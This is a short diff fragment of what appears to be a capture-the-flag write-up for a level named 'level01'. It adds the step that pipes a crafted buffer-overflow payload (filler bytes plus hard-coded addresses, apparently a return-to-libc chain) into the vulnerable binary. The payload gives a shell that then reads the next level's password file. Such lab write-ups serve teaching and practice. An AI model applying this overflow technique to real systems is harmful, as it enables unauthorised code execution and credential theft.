@@ -57,6 +57,7 @@ This payload will allow us to exploit the flaw present here :
 
 ```c
 python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/boom
+cat /tmp/boom - | ./level01
 cat /home/users/level02/.pass
 ```
 
